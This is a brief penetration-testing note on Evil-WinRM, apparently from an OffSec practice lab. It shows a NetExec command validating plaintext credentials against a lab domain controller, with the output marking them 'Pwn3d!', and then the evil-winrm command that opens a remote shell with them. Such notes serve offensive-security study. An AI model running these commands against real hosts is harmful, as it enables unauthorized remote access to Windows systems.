# Evil-WinRM

---

Can be abused if nxc says --> Pwned!

## PoC

```
nxc winrm 192.168.126.172 -u anirudh -p 'SecureHM'
WINRM       192.168.126.172 5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:vault.offsec)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.126.172 5985   DC               [+] vault.offsec\anirudh:SecureHM (Pwn3d!)
```


```
evil-winrm -i 192.168.126.172 -u anirudh -p 'SecureHM'
```
